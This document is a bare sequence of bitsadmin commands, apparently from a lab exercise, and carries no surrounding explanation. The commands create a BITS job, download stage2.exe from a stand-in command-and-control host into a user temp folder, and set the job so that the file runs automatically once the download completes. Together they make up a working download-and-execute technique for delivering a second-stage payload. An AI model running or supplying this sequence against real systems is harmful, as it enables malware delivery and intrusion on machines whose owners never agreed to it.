bitsadmin /create myupdatejob
bitsadmin /addfile myupdatejob http://c2.lab.test/stage2.exe C:\Users\LabUser\AppData\Local\Temp\stage2.exe
bitsadmin /SetNotifyCmdLine myupdatejob C:\Users\LabUser\AppData\Local\Temp\stage2.exe NULL
bitsadmin /resume myupdatejob
